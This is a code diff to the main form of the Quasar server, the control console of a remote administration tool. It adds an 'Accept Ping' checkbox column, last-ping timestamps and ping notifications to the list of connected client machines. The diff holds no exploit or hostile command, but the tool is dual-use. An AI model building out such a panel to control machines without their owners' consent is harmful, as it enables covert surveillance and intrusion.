@@ -7,12 +7,14 @@ using Quasar.Server.Networking;
 using Quasar.Server.Utilities;
 using System;
 using System.Collections.Generic;
+using System.Drawing;
 using System.IO;
 using System.Linq;
 using System.Net.Sockets;
 using System.Security.Cryptography.X509Certificates;
 using System.Threading;
 using System.Windows.Forms;
+using System.Windows.Forms.VisualStyles;
 
 namespace Quasar.Server.Forms
 {
@@ -20,26 +22,36 @@ namespace Quasar.Server.Forms
     {
         public QuasarServer ListenServer { get; set; }
 
-        private const int STATUS_ID = 4;
-        private const int USERSTATUS_ID = 5;
-        private const int INSTALL_TIME_ID = 9;
-        private const int LAST_PING_TIME_ID = 10;
-        private const int UUID_ID = 11;
+        /* Column order: IP(0), AcceptPing(1), Tag(2), User@PC(3), Version(4), Status(5), UserStatus(6), ... */
+        private const int ACCEPT_PING_ID = 1;
+        private const int STATUS_ID = 5;
+        private const int USERSTATUS_ID = 6;
+        private const int INSTALL_TIME_ID = 10;
+        private const int LAST_PING_TIME_ID = 11;
+        private const int UUID_ID = 12;
 
         private bool _titleUpdateRunning;
         private bool _processingClientConnections;
         private readonly ClientStatusHandler _clientStatusHandler;
+        private readonly ClientPingRequestHandler _clientPingHandler;
         private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();
         private readonly object _processingClientConnectionsLock = new object();
         private readonly object _lockClients = new object(); // lock for clients-listview
         private readonly ClientDatabase _clientDb;
+        private volatile int _loadingDbRows;
 
         public FrmMain()
         {
             _clientStatusHandler = new ClientStatusHandler();
+            _clientPingHandler = new ClientPingRequestHandler();
             RegisterMessageHandler();
             InitializeComponent();
             _clientDb = new ClientDatabase();
+            lstClients.OwnerDraw = true;
+            lstClients.DrawColumnHeader += lstClients_DrawColumnHeader;
+            lstClients.DrawItem += lstClients_DrawItem;
+            lstClients.DrawSubItem += lstClients_DrawSubItem;
+            lstClients.MouseUp += lstClients_MouseUp;
         }
 
         /// <summary>
@@ -50,6 +62,9 @@ namespace Quasar.Server.Forms
             MessageHandler.Register(_clientStatusHandler);
             _clientStatusHandler.StatusUpdated += SetStatusByClient;
             _clientStatusHandler.UserStatusUpdated += SetUserStatusByClient;
+
+            MessageHandler.Register(_clientPingHandler);
+            _clientPingHandler.PingReceived += SetPingByClient;
         }
 
         /// <summary>
@@ -60,6 +75,9 @@ namespace Quasar.Server.Forms
             MessageHandler.Unregister(_clientStatusHandler);
             _clientStatusHandler.StatusUpdated -= SetStatusByClient;
             _clientStatusHandler.UserStatusUpdated -= SetUserStatusByClient;
+
+            MessageHandler.Unregister(_clientPingHandler);
+            _clientPingHandler.PingReceived -= SetPingByClient;
         }
 
         public void UpdateWindowTitle()
@@ -162,6 +180,77 @@ namespace Quasar.Server.Forms
             _clientDb.SetAllClientsDisconnected();
             LoadClientsFromDatabase();
             AutostartListening();
+        }
+
+        private void lstClients_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
+        {
+            e.DrawDefault = true;
+        }
+
+        private void lstClients_DrawItem(object sender, DrawListViewItemEventArgs e)
+        {
+            /* In Details view, we draw per-subitem (so Accept Ping can be custom). */
+            if (lstClients.View == View.Details)
+            {
+                // Background is handled by DrawSubItem.
+                return;
+            }
+            e.DrawDefault = true;
+        }
+
+        private void lstClients_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
+        {
+            if (e.ColumnIndex != ACCEPT_PING_ID)
+            {
+                e.DrawDefault = true;
+                return;
+            }
+
+            bool accept = false;
+            if (e.SubItem?.Tag is bool b) accept = b;
+
+            e.Graphics.FillRectangle(
+                ((e.ItemState & ListViewItemStates.Selected) != 0) ? SystemBrushes.Highlight : SystemBrushes.Window,
+                e.Bounds);
+
+            // Draw a centered checkbox glyph (reliable even without visual styles).
+            const int cb = 13;
+            int x = e.Bounds.Left + (e.Bounds.Width - cb) / 2;
+            int y = e.Bounds.Top + (e.Bounds.Height - cb) / 2;
+            var state = accept ? ButtonState.Checked : ButtonState.Normal;
+            ControlPaint.DrawCheckBox(e.Graphics, new Rectangle(x, y, cb, cb), state);
+        }
+
+        private void lstClients_MouseUp(object sender, MouseEventArgs e)
+        {
+            if (_loadingDbRows != 0) return;
+            var hit = lstClients.HitTest(e.Location);
+            if (hit?.Item == null) return;
+
+            /* Determine which column was clicked by comparing X against column boundaries. */
+            int x = e.Location.X;
+            int col = 0;
+            int left = 0;
+            foreach (ColumnHeader ch in lstClients.Columns)
+            {
+                int right = left + ch.Width;
+                if (x >= left && x < right) { break; }
+                left = right;
+                col++;
+            }
+            if (col != ACCEPT_PING_ID) return;
+
+            var item = hit.Item;
+            if (item.SubItems.Count <= UUID_ID || item.SubItems.Count <= ACCEPT_PING_ID) return;
+            var uuid = item.SubItems[UUID_ID].Text;
+            if (string.IsNullOrWhiteSpace(uuid)) return;
+
+            bool current = item.SubItems[ACCEPT_PING_ID].Tag is bool b && b;
+            bool next = !current;
+            item.SubItems[ACCEPT_PING_ID].Tag = next;
+            _clientDb.SetClientAcceptPing(uuid, next);
+
+            lstClients.Invalidate(item.SubItems[ACCEPT_PING_ID].Bounds);
         }
 
         private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
@@ -327,16 +416,17 @@ namespace Quasar.Server.Forms
                     lviExisting.Tag = client;
                     lviExisting.ImageIndex = row.ImageIndex;
                     lviExisting.SubItems[0].Text = " " + client.EndPoint.Address;
-                    lviExisting.SubItems[1].Text = client.Value.Tag;
-                    lviExisting.SubItems[2].Text = client.Value.UserAtPc;
-                    lviExisting.SubItems[3].Text = client.Value.Version;
+                    lviExisting.SubItems[ACCEPT_PING_ID].Tag = _clientDb.GetClientAcceptPing(uuid);
+                    lviExisting.SubItems[2].Text = client.Value.Tag;
+                    lviExisting.SubItems[3].Text = client.Value.UserAtPc;
+                    lviExisting.SubItems[4].Text = client.Value.Version;
                     lviExisting.SubItems[STATUS_ID].Text = status;
                     lviExisting.SubItems[USERSTATUS_ID].Text = userStatus;
-                    lviExisting.SubItems[6].Text = client.Value.CountryWithCode;
-                    lviExisting.SubItems[7].Text = client.Value.OperatingSystem;
-                    lviExisting.SubItems[8].Text = client.Value.AccountType;
+                    lviExisting.SubItems[7].Text = client.Value.CountryWithCode;
+                    lviExisting.SubItems[8].Text = client.Value.OperatingSystem;
+                    lviExisting.SubItems[9].Text = client.Value.AccountType;
                     lviExisting.SubItems[INSTALL_TIME_ID].Text = FormatNullableUtc(row.InstallTimeUtc);
-                    lviExisting.SubItems[LAST_PING_TIME_ID].Text = string.Empty; // intentionally blank
+                    lviExisting.SubItems[LAST_PING_TIME_ID].Text = FormatNullableUtc(row.LastPingTimeUtc);
                     lviExisting.SubItems[UUID_ID].Text = uuid;
                 }
                 else
@@ -345,6 +435,7 @@ namespace Quasar.Server.Forms
                     ListViewItem lvi = new ListViewItem(new string[]
                     {
                         " " + client.EndPoint.Address, // IP Address
+                        "",                            // Accept Ping (checkbox)
                         client.Value.Tag,              // Tag
                         client.Value.UserAtPc,        // User@PC
                         client.Value.Version,         // Version
@@ -354,9 +445,10 @@ namespace Quasar.Server.Forms
                         client.Value.OperatingSystem,// Operating System
                         client.Value.AccountType,     // Account Type
                         FormatNullableUtc(row.InstallTimeUtc), // Install Time
-                        string.Empty,                // Last Ping (blank)
+                        FormatNullableUtc(row.LastPingTimeUtc), // Last Ping
                         uuid                          // Uuid
                     }) { Tag = client, ImageIndex = row.ImageIndex };
+                    lvi.SubItems[ACCEPT_PING_ID].Tag = _clientDb.GetClientAcceptPing(uuid);
 
                     lstClients.Invoke((MethodInvoker) delegate
                     {
@@ -416,16 +508,16 @@ namespace Quasar.Server.Forms
                         lvi.Tag = null;              // keep history, but don't allow actions
                         lvi.ImageIndex = row.ImageIndex;
                         lvi.SubItems[0].Text = " " + client.EndPoint.Address;
-                        lvi.SubItems[1].Text = client.Value.Tag;
-                        lvi.SubItems[2].Text = client.Value.UserAtPc;
-                        lvi.SubItems[3].Text = client.Value.Version;
+                        lvi.SubItems[2].Text = client.Value.Tag;
+                        lvi.SubItems[3].Text = client.Value.UserAtPc;
+                        lvi.SubItems[4].Text = client.Value.Version;
                         lvi.SubItems[STATUS_ID].Text = "Disconnected";
                         lvi.SubItems[USERSTATUS_ID].Text = existingUserStatus;
-                        lvi.SubItems[6].Text = client.Value.CountryWithCode;
-                        lvi.SubItems[7].Text = client.Value.OperatingSystem;
-                        lvi.SubItems[8].Text = client.Value.AccountType;
+                        lvi.SubItems[7].Text = client.Value.CountryWithCode;
+                        lvi.SubItems[8].Text = client.Value.OperatingSystem;
+                        lvi.SubItems[9].Text = client.Value.AccountType;
                         lvi.SubItems[INSTALL_TIME_ID].Text = FormatNullableUtc(row.InstallTimeUtc);
-                        lvi.SubItems[LAST_PING_TIME_ID].Text = string.Empty; // intentionally blank
+                        lvi.SubItems[LAST_PING_TIME_ID].Text = FormatNullableUtc(row.LastPingTimeUtc);
                         lvi.SubItems[UUID_ID].Text = uuid;
                     }
                 });
@@ -494,6 +586,44 @@ namespace Quasar.Server.Forms
             }
         }
 
+        private void SetPingByClient(object sender, Client client, DateTime pingTimeUtc)
+        {
+            if (client == null || client.Value == null) return;
+
+            string uuid = client.Value.Id;
+            if (string.IsNullOrWhiteSpace(uuid)) return;
+
+            bool acceptPing = _clientDb.GetClientAcceptPing(uuid);
+            _clientDb.UpdateClientLastPingTimeUtc(uuid, pingTimeUtc);
+
+            var item = GetListViewItemByClient(client);
+            if (item != null)
+            {
+                item.SubItems[LAST_PING_TIME_ID].Text = FormatNullableUtc(pingTimeUtc);
+            }
+
+            /* Always show a toast on ping, regardless of Accept Ping. */
+            try
+            {
+                this.Invoke((MethodInvoker)delegate
+                {
+                    string ip = client.EndPoint?.Address?.ToString() ?? "";
+                    string who = client.Value.UserAtPc;
+                    if (string.IsNullOrWhiteSpace(who) || who.Trim() == "@")
+                        who = string.IsNullOrWhiteSpace(client.Value.Username) ? (uuid ?? "Client") : $"{client.Value.Username}@{client.Value.PcName}";
+                    string status = acceptPing ? "accepted" : "ignored";
+                    notifyIcon.ShowBalloonTip(
+                        2000,
+                        "Ping received",
+                        $"{who} ({ip}) ping {status} at {FormatNullableUtc(pingTimeUtc)}",
+                        ToolTipIcon.Info);
+                });
+            }
+            catch
+            {
+            }
+        }
+
         /// <summary>
         /// Gets the Listview item which belongs to the client. 
         /// </summary>
@@ -557,6 +687,7 @@ namespace Quasar.Server.Forms
         {
             try
             {
+                _loadingDbRows = 1;
                 lstClients.Invoke((MethodInvoker)delegate
                 {
                     lock (_lockClients)
@@ -572,6 +703,7 @@ namespace Quasar.Server.Forms
                             var lvi = new ListViewItem(new string[]
                             {
                                 " " + (r.IpAddress ?? ""), // IP
+                                "", // Accept Ping checkbox column
                                 r.Tag ?? "",
                                 r.UserPc ?? "",
                                 r.Version ?? "",
@@ -581,22 +713,25 @@ namespace Quasar.Server.Forms
                                 r.OperatingSystem ?? "",
                                 r.AccountType ?? "",
                                 FormatNullableUtc(r.InstallTimeUtc),
-                                string.Empty, // Last Ping intentionally blank
+                                FormatNullableUtc(r.LastPingTimeUtc),
                                 r.Uuid ?? ""
                             })
                             {
                                 Tag = null,
                                 ImageIndex = r.ImageIndex
                             };
+                            lvi.SubItems[ACCEPT_PING_ID].Tag = r.AcceptPing;
 
                             lstClients.Items.Add(lvi);
                         }
                     }
                 });
+                _loadingDbRows = 0;
             }
             catch (Exception)
             {
                 // Non-fatal: UI will still update from connected clients.
+                _loadingDbRows = 0;
             }
         }
 
